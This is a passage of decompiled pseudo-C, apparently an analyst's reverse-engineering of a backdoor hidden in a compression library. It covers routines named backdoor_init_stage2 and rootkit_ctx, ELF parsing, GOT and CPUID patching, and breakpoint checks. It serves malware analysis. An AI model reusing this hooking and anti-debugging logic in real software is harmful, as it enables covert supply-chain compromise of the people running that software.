    *(_QWORD *)(global_counter_deref + 936) = v85;
  }
  if ( v158 )
  {
    v86 = &v82->elf_hdr->e_ident[*((_QWORD *)v158 + 1)];
    ++*(_DWORD *)(global_counter_deref + 960);
    *(_QWORD *)(global_counter_deref + 920) = v86;
  }
  v87 = import_lookup_get_str(v82, 1008, 0);
  v88 = *(_QWORD *)(global_counter_deref + 344);
  v177 = v87;
  v89 = parser_1.elf_info_arr[0];
  elf_result.field_58 = 0LL;
  LODWORD(v195) = 0;
  *(_QWORD *)v88 = 0LL;
  *(_DWORD *)(v88 + 8) = 0;
  v159 = (__int64 *)v89;
  v170 = maybe_find_freespaces(v89, (unsigned __int64 *)&elf_result.field_58, 0);
  if ( v170 )
  {
    v180 = elf_result.field_58;
    if ( v217 )
    {
      *(_QWORD *)(v88 + 168) = v217;
      *(_QWORD *)(v88 + 176) = v218;
      LODWORD(v195) = 1024;
      v90 = Llzip_decode_0(v159, &v195, 0LL);
      *(_QWORD *)(v88 + 208) = v90;
      if ( v90
        && !sub_2A40(
              0x16u,
              (_DWORD **)(v88 + 40),
              (_QWORD *)(v88 + 48),
              (__int64 *)(v88 + 56),
              v159,
              (__int64)v216,
              v162) )
      {
        *(_QWORD *)(v88 + 40) = 0LL;
        *(_QWORD *)(v88 + 48) = 0LL;
        *(_QWORD *)(v88 + 56) = 0LL;
      }
      LODWORD(v195) = 1976;
      v91 = Llzip_decode_0(v159, &v195, 0LL);
      *(_QWORD *)(v88 + 216) = v91;
      if ( v91 )
      {
        if ( sub_2A40(
               0x17u,
               (_DWORD **)(v88 + 72),
               (_QWORD *)(v88 + 80),
               (__int64 *)(v88 + 88),
               v159,
               (__int64)v216,
               v162) )
        {
          if ( !sub_2A40(
                  0x18u,
                  (_DWORD **)(v88 + 104),
                  (_QWORD *)(v88 + 112),
                  (__int64 *)(v88 + 120),
                  v159,
                  (__int64)v216,
                  v162) )
          {
            *(_QWORD *)(v88 + 104) = 0LL;
            *(_QWORD *)(v88 + 112) = 0LL;
            *(_QWORD *)(v88 + 120) = 0LL;
          }
        }
        else
        {
          *(_QWORD *)(v88 + 72) = 0LL;
          *(_QWORD *)(v88 + 80) = 0LL;
          *(_QWORD *)(v88 + 88) = 0LL;
        }
      }
      if ( *(_QWORD *)(v88 + 40) || *(_QWORD *)(v88 + 72) )
      {
        v92 = *(_QWORD **)(global_counter_deref + 344);
        v206 = 0LL;
        v93 = v92[5];
        if ( v93 )
        {
          v94 = v92[6];
        }
        else
        {
          v93 = v92[9];
          if ( !v93 )
            goto LABEL_129;
          v94 = v92[10];
        }
        v178 = v94;
        v95 = 0;
        v96 = 0LL;
        LODWORD(v196) = 408;
        while ( 1 )
        {
          v164 = Llzip_decode_0(v159, &v196, v96);
          if ( !v164 )
            break;
          v206 = 0LL;
          updated = Lstream_encoder_update_0(v159, v164, 0LL, 0LL, &v206);
          if ( !updated )
          {
            v206 = 0LL;
            v95 = 1;
            updated = (unsigned __int64)Lstream_encoder_update_1((struct_elf_info *)v159, v164, 0LL, 0LL, &v206);
          }
LABEL_95:
          if ( updated )
          {
            while ( 1 )
            {
              v182 = updated;
              if ( (unsigned int)Lauto_decode_1(v159, updated, 8LL, 1LL) )
              {
                if ( (unsigned int)Llzma_properties_size_0(v93, v178, 0LL, 265LL, v182) )
                  break;
              }
              v98 = v164;
              v99 = (struct_elf_info *)v159;
              if ( v95 )
                goto LABEL_103;
              updated = Lstream_encoder_update_0(v159, v164, 0LL, 0LL, &v206);
              if ( !updated )
              {
                v98 = v164;
                v99 = (struct_elf_info *)v159;
                v206 = 0LL;
LABEL_103:
                v95 = 1;
                updated = (unsigned __int64)Lstream_encoder_update_1(v99, v98, 0LL, 0LL, &v206);
                goto LABEL_95;
              }
            }
            i = *(_QWORD *)(v88 + 40) == 0LL;
            *(_QWORD *)(*(_QWORD *)(global_counter_deref + 344) + 160LL) = v182;
            if ( !i )
              *(_DWORD *)(v88 + 4) = 1;
            if ( *(_QWORD *)(v88 + 72) )
            {
              i = *(_QWORD *)(v88 + 104) == 0LL;
              *(_DWORD *)v88 = 1;
              if ( !i )
                *(_DWORD *)(v88 + 8) = 1;
            }
            v100 = sub_2C50(17LL, v216, v170, v170 + v180, v182);
            if ( v100 )
              *(_QWORD *)(*(_QWORD *)(global_counter_deref + 344) + 192LL) = v100;
            v101 = (__int64 *)&v206;
            v102 = 0;
            LODWORD(v207) = 112;
            v206 = 0xC5800000948LL;
            do
            {
              if ( Llzip_decode_0(v159, v101, 0LL) )
              {
                if ( v102 == 1 )
                {
                  *(_DWORD *)(*(_QWORD *)(global_counter_deref + 344) + 184LL) = 1;
                  goto LABEL_117;
                }
                v102 = 1;
              }
              v101 = (__int64 *)((char *)v101 + 4);
            }
            while ( v101 != (__int64 *)((char *)&v207 + 4) );
            *(_DWORD *)(*(_QWORD *)(global_counter_deref + 344) + 184LL) = 0;
LABEL_117:
            v104 = sub_2C50(21LL, v216, v170, v170 + v180, v103);
            if ( v104 )
            {
              if ( !*(_DWORD *)(*(_QWORD *)(global_counter_deref + 344) + 184LL)
                || !*(_DWORD *)(global_counter_deref + 312) )
              {
                goto LABEL_128;
              }
              v105 = 0LL;
              LODWORD(v207) = 16;
              v206 = 0xF0000000ELL;
              v160 = 0;
              v106 = 0;
              do
              {
                v107 = &v216[2 * *((unsigned int *)&v206 + v105)];
                v108 = *((_QWORD *)v107 + 1);
                if ( v108 )
                {
                  v165 = *((_QWORD *)v107 + 1);
                  ++v106;
                  v171 = *((_QWORD *)v107 + 2);
                  if ( (unsigned int)Lstream_encoder_mt_init_1(v108, v171, 0LL, v104)
                    || (unsigned int)Llzma_simple_x86_decoder_init_1(v165, v171, 0LL, v104) )
                  {
                    ++v160;
                  }
                }
                ++v105;
              }
              while ( v105 != 3 );
              if ( !v106 || v160 )
LABEL_128:
                *(_QWORD *)(*(_QWORD *)(global_counter_deref + 344) + 200LL) = v104;
            }
            break;
          }
          v96 = v164 + 8;
        }
      }
    }
  }
LABEL_129:
  v179 = import_lookup_get_str(parser_1.elf_info_arr[4], 680, 0);
  if ( !(unsigned int)Llzma_mf_bt4_find_0((__int64 *)parser_1.elf_info_arr[0], (__int64)v216, (__int64)v162) )
  {
    *(_DWORD *)(global_counter_deref + 968) = 0;
    *(_DWORD *)(global_counter_deref + 976) = 0;
  }
  v109 = *(_QWORD *)(global_counter_deref + 360);
  v173->elf_info = parser_1.elf_info_arr[2];
  v195 = 0LL;
  *(_QWORD *)v109 = 0LL;
  v172 = Llzma_check_update_0((__int64)parser_1.elf_infos, &v195);
  if ( v172 )
  {
    v110 = v195;
    if ( v195 > 0x10 )
    {
      v111 = v219;
      if ( v219 )
      {
        if ( !*(_DWORD *)(global_counter_deref + 312)
          || (unsigned int)check_software_breakpoint(v219, (__int64)(v219 + 1), 57904) )
        {
          v112 = 22LL;
          *(_QWORD *)(v109 + 88) = v111;
          v113 = &elf_result.field_58;
          while ( v112 )
          {
            *(_DWORD *)v113 = 0;
            v113 = (__int64 *)((char *)v113 + 4);
            --v112;
          }
          if ( v220 )
          {
            v166 = v220;
            v174 = 0LL;
            v114 = v110 + v172;
            v115 = 0LL;
            v161 = v221;
            v181 = v114;
            while ( 1 )
            {
              while ( 1 )
              {
                if ( v166 >= v161 || v174 && v115 )
                  goto LABEL_229;
                if ( (unsigned int)code_dasm(&elf_result.field_58, v166, v161) )
                  break;
                ++v166;
              }
              if ( (v203 & 0xFFFFFFFD) == 177 )
                break;
              if ( v203 != 327 )
                goto LABEL_146;
              v129 = v201;
              LOBYTE(v129) = 0;
              if ( v129 != 83886080 )
                goto LABEL_146;
              if ( (v199 & 0x800) == 0 )
                goto LABEL_146;
              v116 = v205;
              if ( v205 )
                goto LABEL_146;
              if ( (v199 & 0x100) != 0 )
                v116 = v198 + elf_result.field_58 + v204;
              v206 = 0LL;
              v130 = maybe_find_freespaces(parser_1.elf_infos, &v206, 0);
              if ( !v130 || v116 >= v130 + v206 || v130 > v116 )
                goto LABEL_146;
              v131 = &v206;
              for ( n = 22LL; n; --n )
              {
                *(_DWORD *)v131 = 0;
                v131 = (unsigned __int64 *)((char *)v131 + 4);
              }
              v133 = v166;
              while ( 1 )
              {
                if ( !(unsigned int)Llzma_properties_size_0(v133, v161, &v206, 327LL, 0LL) )
                  goto LABEL_213;
                if ( !v213 && (v208 & 0x100) != 0 )
                {
                  v115 = v212;
                  if ( (v210 & 0xFF00FF00) == 83886080 )
                    v115 = v207 + v206 + v212;
                  v196 = 0LL;
                  v134 = maybe_find_freespaces(parser_1.elf_infos, &v196, 0);
                  if ( v134 )
                  {
                    if ( v115 < v134 + v196 && v134 <= v115 && v116 != v115 )
                      break;
                  }
                }
                v133 = v206 + v207;
                if ( v206 + v207 >= v161 )
                  goto LABEL_213;
              }
LABEL_221:
              if ( (unsigned int)sub_2B00(v116, v115, v172, v181, v216, v162) )
              {
                *(_QWORD *)(v109 + 56) = v116;
                *(_QWORD *)(v109 + 64) = v115;
                *(_DWORD *)(v109 + 4) = 1;
                LODWORD(v206) = 1800;
                v135 = Llzip_decode_0(parser_1.elf_infos, &v206, 0LL);
                *(_QWORD *)(v109 + 16) = v135;
                if ( !v135 )
                  goto LABEL_228;
                LODWORD(v206) = 1936;
                v136 = Llzip_decode_0(parser_1.elf_infos, &v206, 0LL);
                *(_QWORD *)(v109 + 24) = v136;
                if ( !v136 )
                  goto LABEL_228;
                LODWORD(v206) = 1264;
                v152 = Llzip_decode_0(parser_1.elf_infos, &v206, 0LL);
                *(_QWORD *)(v109 + 32) = v152;
                if ( !v152
                  || (LODWORD(v206) = 472,
                      v153 = Llzip_decode_0(parser_1.elf_infos, &v206, 0LL),
                      (*(_QWORD *)(v109 + 40) = v153) == 0LL)
                  || (LODWORD(v206) = 2832,
                      v154 = Llzip_decode_0(parser_1.elf_infos, &v206, 0LL),
                      (*(_QWORD *)(v109 + 48) = v154) == 0LL) )
                {
LABEL_228:
                  *(_DWORD *)v109 = 1;
                }
                goto LABEL_229;
              }
LABEL_147:
              v166 += v198;
              v174 = v116;
            }
            if ( BYTE1(v201) != 3 )
            {
LABEL_146:
              v116 = v174;
              goto LABEL_147;
            }
            v117 = v199 & 0x40;
            if ( (v199 & 0x1040) != 0 )
            {
              if ( v117 )
              {
                v118 = BYTE2(v201);
                if ( (v199 & 0x20) != 0 )
                  v118 = (2 * v200) & 8 | BYTE2(v201);
                goto LABEL_159;
              }
              v119 = HIBYTE(v199) & 0x10;
              if ( (v199 & 0x1000) != 0 )
              {
                v118 = v202;
                if ( (v199 & 0x20) != 0 )
                  v118 = (8 * v200) & 8 | v202;
                v119 = 0;
LABEL_161:
                if ( v118 != v119 )
                  goto LABEL_146;
              }
            }
            else
            {
              if ( v117 )
              {
                v118 = 0;
LABEL_159:
                v119 = HIBYTE(v201);
                if ( (v199 & 0x20) != 0 )
                  v119 = (8 * v200) & 8 | HIBYTE(v201);
                goto LABEL_161;
              }
              v119 = 0;
            }
            v120 = &v206;
            v121 = 0;
            v122 = 22LL;
            v175 = 0;
            v115 = 0LL;
            v116 = 0LL;
            while ( v122 )
            {
              *(_DWORD *)v120 = 0;
              v120 = (unsigned __int64 *)((char *)v120 + 4);
              --v122;
            }
            for ( ii = v166; ; ii = v206 + v207 )
            {
              if ( ii >= v161 || v175 > 4 )
                goto LABEL_171;
              if ( v116 && v115 )
                goto LABEL_221;
              v185 = v121;
              v183 = v119;
              v124 = Llzma_filters_update_1(ii, v161, 1LL, 0LL, &v206);
              v119 = v183;
              v121 = v185;
              if ( !v124 )
              {
LABEL_171:
                if ( v116 && v115 )
                  goto LABEL_221;
LABEL_213:
                v115 = 0LL;
                v116 = 0LL;
                goto LABEL_147;
              }
              if ( (v208 & 0x1040) != 0 )
              {
                if ( (v208 & 0x40) != 0 )
                {
                  v121 = BYTE2(v210);
                  if ( (v208 & 0x20) == 0 )
                    goto LABEL_184;
                  v125 = 2 * v209;
                }
                else
                {
                  v121 = HIBYTE(v208) & 0x10;
                  if ( (v208 & 0x1000) == 0 )
                    goto LABEL_184;
                  v121 = v211;
                  if ( (v208 & 0x20) == 0 )
                    goto LABEL_184;
                  v125 = 8 * v209;
                }
                v121 |= v125 & 8;
              }
LABEL_184:
              if ( v183 == v121 && (v208 & 0x100) != 0 )
              {
                v126 = v212;
                if ( (v210 & 0xFF00FF00) == 83886080 )
                  v126 = v207 + v206 + v212;
                v187 = v121;
                v196 = 0LL;
                v186 = v183;
                v184 = v126;
                v127 = maybe_find_freespaces(parser_1.elf_infos, &v196, 0);
                v119 = v186;
                v121 = v187;
                if ( v127 )
                {
                  v128 = v184;
                  if ( v184 < v127 + v196 && v127 <= v184 && (v184 != v115 || v184 != v116) )
                  {
                    if ( !v116 )
                      goto LABEL_196;
                    v115 = v184;
                  }
                }
              }
              v128 = v116;
LABEL_196:
              ++v175;
              v116 = v128;
            }
          }
        }
      }
    }
  }
LABEL_229:
  v137 = parser_1.elf_info_arr[4];
  v168->elf_info = parser_1.elf_info_arr[4];
  if ( v177 )
  {
    v138 = &v137->elf_hdr->e_ident[*((_QWORD *)v177 + 1)];
    ++*(_DWORD *)(global_counter_deref + 960);
    *(_QWORD *)(global_counter_deref + 848) = v138;
  }
  if ( v179 )
  {
    v139 = &v137->elf_hdr->e_ident[*((_QWORD *)v179 + 1)];
    ++*(_DWORD *)(global_counter_deref + 960);
    *(_QWORD *)(global_counter_deref + 856) = v139;
  }
  if ( !(unsigned int)sub_2880(v167) )
    goto LABEL_16;
  lzma_free(*(_QWORD *)(global_counter_deref + 792), v168);
  if ( *(_DWORD *)(global_counter_deref + 1192) != 12
    || !apply_one_entry_ex(1uLL, 0x145u, 0x7Fu, 0x18u)
    || !apply_one_entry_ex(*(_QWORD *)(init->cpuid_got_ptr + 64), 0x12Au, 4u, 0x12u)
    || !(unsigned int)apply_one_entry(0x12Eu, 0x13u, 4u, 32, *(_DWORD **)(init->cpuid_got_ptr + 72))
    || !apply_one_entry_ex(init->static_gots->cpu_id, 306u, 6u, 0x14u)
    || !(unsigned int)apply_one_entry(312u, 0x15u, 2u, 16, *(_DWORD **)(init->cpuid_got_ptr + 80))
    || !(unsigned int)apply_one_entry(0xEEu, 0x10u, 0x26u, 32, *(_DWORD **)(init->cpuid_got_ptr + 112))
    || !(unsigned int)apply_one_entry(0x140u, 0x17u, 5u, 32, *(_DWORD **)(init->cpuid_got_ptr + 120))
    || !(unsigned int)apply_one_entry(0x13Au, 0x16u, 6u, 32, init->static_gots->field_0)
    || !(unsigned int)apply_one_entry(0x114u, 0x11u, 0x16u, 16, (_DWORD *)v169->parse_elf)
    || *(_DWORD *)(global_counter_deref + 664) != 456 )
  {
    goto LABEL_16;
  }
  v140 = parser_1.ehdr;
  **(_QWORD **)(global_counter_deref + 248) = global_counter_deref;
  v141 = v189 + 8;
  v142 = (int *)(v189 + 8 + v140);
  v143 = *v142;
  *(_QWORD *)(global_counter_deref + 80) = v142;
  *(_DWORD *)(global_counter_deref + 88) = v143;
  *v142 = 2;
  **(_BYTE **)(global_counter_deref + 96) |= *(_BYTE *)(global_counter_deref + 104);
  v144 = (_DWORD *)(parser_1.field3 + v141);
  v145 = 30LL;
  LODWORD(v142) = *v144;
  *(_QWORD *)(global_counter_deref + 64) = v144;
  *(_DWORD *)(global_counter_deref + 72) = (_DWORD)v142;
  *v144 = 1;
  v146 = (_DWORD *)(global_counter_deref + 128);
  while ( v145 )
  {
    *v146++ = 0;
    --v145;
  }
  *(_QWORD *)(global_counter_deref + 160) = *(_QWORD *)(init->cpuid_got_ptr + 64);
  **(_QWORD **)(global_counter_deref + 112) = global_counter_deref + 128;
  v147 = (__int64)glo_allocator;
  **(_DWORD **)(global_counter_deref + 120) = 1;
  v148 = 0LL;
  for ( jj = v147 == 0; !jj; jj = v148 == 24 )
  {
    *(_BYTE *)(v147 + v148) = *((_BYTE *)&local_allocor.alloc + v148);
    ++v148;
  }
  v150 = 598LL;
  v22 = 1LL;
  v151 = &parser_1;
  while ( v150 )
  {
    LODWORD(v151->ehdr) = 0;
    v151 = (struc_parse_elf *)((char *)v151 + 4);
    --v150;
  }
  ctx = init->rookit_ctx;
label_exit:
  Llzma_block_param_decoder_0(ctx, v22, &parser_1, 0LL);
  ctx->runtime_addr = 1LL;
  ctx->runtime_offset = 0LL;
  ctx->cpuid_got_ptr = 0LL;
  ctx->cpu_id_got = 0LL;
  ctx->self = 0LL;
  _RAX = 0LL;
  __asm { cpuid }
  if ( (_DWORD)_RAX )
  {
    _RAX = 1LL;
    __asm { cpuid }
    LODWORD(ctx->runtime_offset) = _RAX;
    LODWORD(ctx->cpuid_got_ptr) = _RBX;
    LODWORD(ctx->cpu_id_got) = _RCX;
    LODWORD(ctx->self) = _RDX;
  }
  return 0LL;
}
// 58FE: variable 'rookit_ctx_rcx' is possibly undefined
// 64E2: variable 'v103' is possibly undefined
// DF0: using guessed type __int64 __fastcall Llzma_filters_update_1(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1050: using guessed type __int64 __fastcall Llzma_properties_size_0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1110: using guessed type __int64 __fastcall Lstream_encoder_mt_init_1(_QWORD, _QWORD, _QWORD, _QWORD);
// 1160: using guessed type __int64 __fastcall Llzma_simple_x86_decoder_init_1(_QWORD, _QWORD, _QWORD, _QWORD);
// 2090: using guessed type __int64 __fastcall Llzip_decode_0(_QWORD, _QWORD, _QWORD);
// 22C0: using guessed type __int64 __fastcall Lauto_decode_1(_QWORD, _QWORD, _QWORD, _QWORD);
// 2B00: using guessed type __int64 __fastcall sub_2B00(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 2C50: using guessed type __int64 __fastcall sub_2C50(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 3FD0: using guessed type __int64 __fastcall Llzma_block_param_decoder_0(_QWORD, _QWORD, _QWORD, _QWORD);
// CB78: using guessed type __int64 __fastcall lzma_free(_QWORD, _QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);
// 5820: using guessed type struc_parse_elf anonymous_7;

//----- (0000000000006F60) ----------------------------------------------------
__int64 __fastcall backdoor_init_stage2(rootkit_ctx *ctx, _QWORD *unused, _QWORD *cpuid_got_ptr, struc_gots *gots)
{
  __int64 v5; // rcx
  _DWORD *p_vtbl; // rdi
  _DWORD *p_init2; // rdi
  __int64 i; // rcx
  int v9; // eax
  __int64 cpuid_got_ptr_1; // rdx
  struc_gots *gots_1; // rcx
  struc_vtbl vtbl; // [rsp+20h] [rbp-128h] BYREF
  struc_init22 init2; // [rsp+A8h] [rbp-A0h] BYREF

  v5 = 34LL;
  p_vtbl = &vtbl;
  while ( v5 )                                  // 17 QWORD
  {
    *p_vtbl++ = 0;
    --v5;
  }
  p_init2 = &init2;
  for ( i = 34LL; i; --i )                      // 17 QWORD
    *p_init2++ = 0;
  lzma_check_init(&init2.field_18, 0LL);        // do nothing
  v9 = backdoor_vtbl_init(&vtbl);               // first: a1->static_gots is NULL, return 101
  do
  {
    if ( !v9 )                                  // first: goes here, return by parse_elf
    {
      init2.cpuid_got_ptr = cpuid_got_ptr_1;
      init2.static_gots = gots_1;
      init2.rookit_ctx = ctx;
      return parse_elf_init(&init2);
    }
    vtbl.static_gots = gots_1;
    v9 = backdoor_vtbl_init((struc_vtbl *)cpuid_got_ptr_1);
  }
  while ( v9 != 5 );
  ctx->runtime_addr = 1LL;
  ctx->runtime_offset = 0LL;
  ctx->cpuid_got_ptr = 0LL;
  ctx->cpu_id_got = 0LL;
  ctx->self = 0LL;
  _RAX = 0LL;
  __asm { cpuid }
  if ( (_DWORD)_RAX )
  {
    _RAX = 1LL;
    __asm { cpuid }
    LODWORD(ctx->runtime_offset) = _RAX;
    LODWORD(ctx->cpuid_got_ptr) = _RBX;
    LODWORD(ctx->cpu_id_got) = _RCX;
    LODWORD(ctx->self) = _RDX;
  }
  return 0LL;
}
// 6FDA: variable 'gots_1' is possibly undefined
// 6FDF: variable 'cpuid_got_ptr_1' is possibly undefined
// CB68: using guessed type __int64 __fastcall lzma_check_init(_QWORD, _QWORD);

//----- (0000000000007060) ----------------------------------------------------
__int64 __fastcall strlen(char *a1)
{
  __int64 result; // rax

  if ( !*a1 )
    return 0LL;
  result = 0LL;
  do
    ++result;
  while ( a1[result] );
  return result;
}

//----- (0000000000007080) ----------------------------------------------------
__int64 __fastcall sub_7080(char *a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v3; // rdx

  result = a2;
  v3 = 0LL;
  if ( a2 )
  {
    while ( a1[v3] )
    {
      if ( a2 == ++v3 )
        return result;
    }
    return v3;
  }
  return result;
}

//----- (00000000000070B0) ----------------------------------------------------
__int64 __fastcall sub_70B0(int a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax
  __int64 v8; // r14
  __int64 v9; // rax

  result = 0LL;
  if ( a3 )
  {
    if ( a1 >= 0 && a4 && *(_QWORD *)(a4 + 72) && *(_QWORD *)(a4 + 80) )
    {
      v8 = a3;
      while ( 1 )
      {
        while ( 1 )
        {
          v9 = (*(__int64 (__fastcall **)(_QWORD, __int64, __int64))(a4 + 72))((unsigned int)a1, a2, v8);
          if ( v9 >= 0 )
            break;
          if ( *(_DWORD *)(*(__int64 (**)(void))(a4 + 80))() != 4 )
            return -1LL;
        }
        if ( !v9 )
          break;
        a2 += v9;
        v8 -= v9;
        if ( !v8 )
          return a3;
      }
    }
    return -1LL;
  }
  return result;
}

//----- (0000000000007120) ----------------------------------------------------
__int64 __fastcall sub_7120(int a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax
  __int64 v7; // rbp
  __int64 v8; // r13
  __int64 v9; // rax

  result = 0LL;
  if ( a3 )
  {
    if ( a1 >= 0 && a4 != 0 )
    {
      v7 = a2;
      if ( a2 )
      {
        if ( *(_QWORD *)(a4 + 56) && *(_QWORD *)(a4 + 80) )
        {
          v8 = a3;
          while ( 1 )
          {
            while ( 1 )
            {
              v9 = (*(__int64 (__fastcall **)(_QWORD, __int64, __int64))(a4 + 56))((unsigned int)a1, v7, v8);
              if ( v9 >= 0 )
                break;
              if ( *(_DWORD *)(*(__int64 (**)(void))(a4 + 80))() != 4 )
                return -1LL;
            }
            if ( !v9 )
              break;
            v7 += v9;
            v8 -= v9;
            if ( !v8 )
              return a3;
          }
        }
      }
    }
    return -1LL;
  }
  return result;
}

//----- (00000000000071A0) ----------------------------------------------------
__int64 __fastcall sub_71A0(__int64 a1, unsigned int a2)
{
  __int64 v2; // rax

  v2 = 0LL;
  while ( (unsigned int)v2 < a2 )
  {
    ++v2;
    if ( !*(_QWORD *)(a1 + 8 * v2 - 8) )
      return 1LL;
  }
  return 0LL;
}

//----- (00000000000071C0) ----------------------------------------------------
__int64 __fastcall sub_71C0(__int64 a1, unsigned int a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  unsigned int v7; // ebp
  __int64 v11; // r9
  __int64 v12; // rbx
  __int64 v13; // rsi
  void (__fastcall *v14)(__int64); // rdx
  void (__fastcall *v15)(__int64, __int64, void (__fastcall *)(__int64)); // rax
  unsigned int (__fastcall *v18)(__int64, __int64, _QWORD, __int64, __int64); // [rsp+8h] [rbp-50h]
  int v19[15]; // [rsp+1Ch] [rbp-3Ch] BYREF

  v19[0] = 0;
  if ( a1 )
  {
    if ( a2 )
    {
      if ( a4 )
      {
        if ( a5 )
        {
          if ( a6 )
          {
            if ( !(unsigned int)sub_71A0(a6 + 160, 6u) )
            {
              v12 = (*(__int64 (**)(void))(v11 + 160))();
              if ( v12 )
              {
                v18 = *(unsigned int (__fastcall **)(__int64, __int64, _QWORD, __int64, __int64))(a6 + 168);
                v13 = (*(__int64 (**)(void))(a6 + 200))();
                if ( v18(v12, v13, 0LL, a3, a4) == 1 )
                {
                  v13 = a5;
                  if ( (*(unsigned int (__fastcall **)(__int64, __int64, int *, __int64, _QWORD))(a6 + 176))(
                         v12,
                         a5,
                         v19,
                         a1,
                         a2) == 1
                    && v19[0] >= 0 )
                  {
                    v13 = a5 + v19[0];
                    v7 = (*(__int64 (__fastcall **)(__int64, __int64, int *))(a6 + 184))(v12, v13, v19);
                    if ( v7 == 1 )
                    {
                      v14 = *(void (__fastcall **)(__int64))(a6 + 192);
                      if ( v19[0] >= 0 && a2 >= v19[0] )
                      {
                        v14(v12);
                        return v7;
                      }
                    }
                  }
                }
                v15 = *(void (__fastcall **)(__int64, __int64, void (__fastcall *)(__int64)))(a6 + 192);
                if ( v15 )
                  v15(v12, v13, v14);
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
// 721B: variable 'v11' is possibly undefined
// 72C7: variable 'v14' is possibly undefined

//----- (00000000000072E0) ----------------------------------------------------
_BOOL8 __fastcall sub_72E0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4, __int64 a5)
{
  unsigned int (__fastcall *v5)(__int64, __int64, __int64, _QWORD, __int64, _QWORD); // r13
  _BOOL8 result; // rax
  __int64 (*v8)(void); // rdx
  __int64 v9; // rax

  if ( !a1 || !a2 || a4 <= 0x1F || !a5 )
    return 0LL;
  v5 = *(unsigned int (__fastcall **)(__int64, __int64, __int64, _QWORD, __int64, _QWORD))(a5 + 240);
  result = 0LL;
  if ( v5 )
  {
    v8 = *(__int64 (**)(void))(a5 + 88);
    if ( v8 )
    {
      v9 = v8();
      return v5(a1, a2, a3, 0LL, v9, 0LL) == 1;
    }
  }
  return result;
}

//----- (0000000000007350) ----------------------------------------------------
__int64 __fastcall sub_7350(__int64 a1, unsigned __int64 a2, _QWORD *a3, __int64 a4, __int64 a5)
{
  __int64 result; // rax
  __int64 (__fastcall *v8)(__int64); // rax
  unsigned int v9; // ebx
  unsigned int v10; // ebx
  __int64 v11; // rbp

  if ( a2 <= 5 || a5 == 0 )
    return 0LL;
  if ( !a4 )
    return 0LL;
  if ( !*(_QWORD *)(a5 + 256) )
    return 0LL;
  *a3 = 0LL;
  v8 = *(__int64 (__fastcall **)(__int64))(a5 + 104);
  if ( !v8 )
    return 0LL;
  v9 = v8(a4);
  if ( v9 > 0x4000 )
    return 0LL;
  v10 = (v9 + 7) >> 3;
  if ( !v10 )
    return 0LL;
  v11 = v10;
  if ( a2 - 6 < v10 )
    return 0LL;
  *(_BYTE *)(a1 + 4) = 0;
  if ( (*(int (__fastcall **)(__int64, __int64))(a5 + 256))(a4, a1 + 5) != (unsigned __int64)v10 )
    return 0LL;
  if ( *(char *)(a1 + 5) >= 0 )
    sub_1B20(a1 + 4, a1 + 5, v10);
  else
    v11 = ++v10;
  *(_DWORD *)a1 = _byteswap_ulong(v10);
  result = 1LL;
  *a3 = v11 + 4;
  return result;
}

//----- (0000000000007430) ----------------------------------------------------
__int64 sub_7430(__int64 a1, unsigned int a2, __int64 a3, ...)
{
  char v4; // [rsp+7h] [rbp-D1h] BYREF
  __va_list_tag va[1]; // [rsp+8h] [rbp-D0h] BYREF

  va_start(va, a3);
  v4 = 0;
  return (*(__int64 (__fastcall **)(char *, char *, _QWORD, _QWORD, _QWORD, _QWORD, __int64, __va_list_tag *))(a1 + 88))(
           &v4,
           &v4,
           0LL,
           0LL,
           a2,
           0LL,
           a3,
           va);
}

//----- (00000000000074E0) ----------------------------------------------------
__int64 __fastcall sub_74E0(__int64 a1, unsigned __int64 *a2, __int64 a3)
{
  __int64 (__fastcall *v3)(__int64, unsigned __int64 *, __int64); // rax
  unsigned __int64 v4; // rax
  unsigned __int64 v6; // rax
  unsigned int v7; // ecx
  unsigned __int64 v8; // rdx

  if ( !a1 )
    return 0LL;
  if ( !a3 )
    return 0LL;
  v3 = *(__int64 (__fastcall **)(__int64, unsigned __int64 *, __int64))(a3 + 8);
  if ( !v3 )
    return 0LL;
  v4 = v3(a1, a2, a3);
  if ( v4 - 8 > 0x7F )
    return 0LL;
  v6 = v4 >> 3;
  v7 = 0;
  v8 = 0LL;
  while ( *(_QWORD *)(a1 + 8 * v8) )
  {
    v8 = ++v7;
    if ( v7 >= v6 )
    {
      v8 = v6;
      break;
    }
  }
  *a2 = v8;
  return 1LL;
}

//----- (0000000000007540) ----------------------------------------------------
__int64 __fastcall sub_7540(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  void (__fastcall *v6)(__int64, __int64 *, __int64 *, _QWORD, double); // rax
  unsigned __int64 v8; // rbx
  unsigned __int64 v9; // [rsp+8h] [rbp-1060h] BYREF
  __int64 v10; // [rsp+10h] [rbp-1058h] BYREF
  __int64 v11; // [rsp+18h] [rbp-1050h] BYREF
  __int128 v12[260]; // [rsp+26h] [rbp-1042h] BYREF

  memset(v12, 0, 4106);
  v9 = 0LL;
  if ( a4
    && a1
    && (v6 = *(void (__fastcall **)(__int64, __int64 *, __int64 *, _QWORD, double))(a4 + 96)) != 0LL
    && (v10 = 0LL, v11 = 0LL, v6(a1, &v11, &v10, 0LL, 0.0), v10)
    && v11
    && (unsigned int)sub_7350(v12, 4106LL, &v9, v10, a4)
    && (v8 = v9, v9 <= 0x1009)
    && (unsigned int)sub_7350((char *)v12 + v9, 4106 - v9, &v9, v11, a4)
    && v9 + v8 <= 0x100A )
  {
    return sub_72E0(v12, v9 + v8, a2, a3, a4);
  }
  else
  {
    return 0LL;
  }
}
// 72E0: using guessed type __int64 __fastcall sub_72E0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 7350: using guessed type __int64 __fastcall sub_7350(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 7540: using guessed type __int64 var_1050;

//----- (0000000000007660) ----------------------------------------------------
__int64 __fastcall sub_7660(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7)
